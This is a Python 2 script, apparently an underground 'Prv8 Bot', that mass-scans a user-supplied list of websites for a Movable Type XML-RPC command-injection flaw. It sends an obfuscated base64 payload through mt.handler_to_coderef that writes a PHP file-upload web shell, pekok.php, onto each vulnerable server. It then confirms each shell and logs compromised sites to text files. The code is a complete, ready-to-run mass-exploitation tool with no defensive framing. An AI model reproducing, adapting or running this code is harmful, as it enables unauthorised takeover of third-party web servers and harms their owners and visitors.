# -*- coding: utf-8 -*
#!/usr/bin/python
#My Friendo : JametKNTLS -  h0d3_g4n - Moslem And All Coders
# Blog : https://www.blog-gan.org          
#DONATE ME :(
	# BTC = 31mtLHqhaXXyCMnT2EU73U8fwYwigiEEU1
	# PERFECT MONEY  = U22270614
################Command#####################
import requests, re, urllib2, os, sys, codecs, random				
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
import socket
import json				   		
from platform import system	
from random import sample
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
from urlparse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
############Color###############
abang = '\033[31m'
ijo = '\033[32m'
kuning = '\033[33m'
birtu = '\033[34m'
ungu = '\033[35m'
biru = '\033[36m'
abu = '\033[37m'
putih = '\033[0m' 
year = time.strftime("%y")
month = time.strftime("%m")
############Shell Backdoor###############
############Logo###############

def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
          \033[31m\   \033[31m/
   \033[34m----- (9\033[31m"-_-\033[34m)9  \033[37mVs  \033[34m6(\033[31mx_x"\033[34m6) -----
   
   \033[32m>--------------------------------<
 Prv8 Bot - Pwrd Ajibarang1337
   
   
   \033[41m\033[1;33m[Blog : https://www.blog-gan.org\033[0m
   \033[41m\033[1;33m[ICQ : https://icq.im/Shin403\033[0m
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()
start_raw = raw_input("\n\033[91mGive,Me List Dear\033[97m:~# \033[97m")
crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
try:
    with open(start_raw, 'r') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
    
try:
    ooo = list(dict.fromkeys(ooo))
except NameError:
    print '\033[31mOpen Your Eyes!'
    sys.exit()
count=0
with open(start_raw,'r')as f:
 for line in f:
    count+=1
print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92mTOTAL WEBLIST=',count

############Mulai :v###############

def jancok(url):
	try:
		headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36'}
		data = """<?xml version="1.0"?>
        <methodCall>
        <methodName>mt.handler_to_coderef</methodName>
        <params>
        <param><value><base64>
        YGVjaG8gIlBEOXdhSEFnWldOb2J5QW5TMmx5YVdkaGVXRWdTMmx5YVhSdkp5NG5QR0p5UGljdUoxVnVZVzFsT2ljdWNHaHdYM1Z1WVcxbEtDa3VKenhpY2o0bkxpUmpkMlFnUFNCblpYUmpkMlFvS1RzZ1JXTm9ieUFuUEdObGJuUmxjajRnSUR4bWIzSnRJRzFsZEdodlpEMGljRzl6ZENJZ2RHRnlaMlYwUFNKZmMyVnNaaUlnWlc1amRIbHdaVDBpYlhWc2RHbHdZWEowTDJadmNtMHRaR0YwWVNJK0lDQThhVzV3ZFhRZ2RIbHdaVDBpWm1sc1pTSWdjMmw2WlQwaU1qQWlJRzVoYldVOUluVndiRzloWkhNaUlDOCtJRHhwYm5CMWRDQjBlWEJsUFNKemRXSnRhWFFpSUhaaGJIVmxQU0oxY0d4dllXUWlJQzgrSUNBOEwyWnZjbTArSUNBOEwyTmxiblJsY2o0OEwzUmtQand2ZEhJK0lEd3ZkR0ZpYkdVK1BHSnlQaWM3SUdsbUlDZ2haVzF3ZEhrZ0tDUmZSa2xNUlZOYkozVndiRzloWkhNblhTa3BJSHNnSUNBZ0lHMXZkbVZmZFhCc2IyRmtaV1JmWm1sc1pTZ2tYMFpKVEVWVFd5ZDFjR3h2WVdSekoxMWJKM1J0Y0Y5dVlXMWxKMTBzSkY5R1NVeEZVMXNuZFhCc2IyRmtjeWRkV3lkdVlXMWxKMTBwT3lBZ0lDQWdSV05vYnlBaVBITmpjbWx3ZEQ1aGJHVnlkQ2duZFhCc2IyRmtJRVJ2Ym1VbktUc2dJQ0FnSUNBZ0lEd3ZjMk55YVhCMFBqeGlQbFZ3Ykc5aFpHVmtJQ0VoSVR3dllqNDhZbkkrYm1GdFpTQTZJQ0l1SkY5R1NVeEZVMXNuZFhCc2IyRmtjeWRkV3lkdVlXMWxKMTB1SWp4aWNqNXphWHBsSURvZ0lpNGtYMFpKVEVWVFd5ZDFjR3h2WVdSekoxMWJKM05wZW1VblhTNGlQR0p5UG5SNWNHVWdPaUFpTGlSZlJrbE1SVk5iSjNWd2JHOWhaSE1uWFZzbmRIbHdaU2RkT3lCOUlEOCtJZz09IiB8IGJhc2U2NCAtLWRlY29kZSA+PiBwZWtvay5waHBg
        </base64></value></param>
        </params>
        </methodCall>"""
		cok = requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=data, timeout=10, verify=False)
		if "MT::handler_to_coderef('mt', '`echo" in cok.content or "MT::handler_to_coderef('mt', '`echo" in cok.text:
            		print(kuning+'[+]' + url + ijo + '>' +' Vuln')
            		open('vulnmt.txt','a').write(url+"/mt/mt-xmlrpc.cgi\n")
            		pekok = requests.get(url+'/mt/pekok.php', headers=headers, timeout=10, verify=False)
            		if 'Kirigaya Kirito' in pekok.content or 'Kirigaya Kirito' in pekok.text:
                		print(kuning+'[+]' + url + ijo + '>' +' Success Uploaded ')
                		open('shellmt.txt','a').write(url+"/mt/pekok.php\n")
            		else:
                		print(kuning+'[+]' + url + abang + '>' +' Failed Uploaded')
		else:
			print(kuning+'[+]' + url + abang + '>' +' Not Vuln')
			
	except:
		pass
	pass
			
			
############Penutup :v###############

def Main():
    try:
        start = timer()
        pp = Pool(int(crownes))
        pp = pp.map(jancok, ooo)
        print('TIME TAKE: ' + str(timer() - start) + ' S')
    except:
        pass


if __name__ == '__main__':
    Main()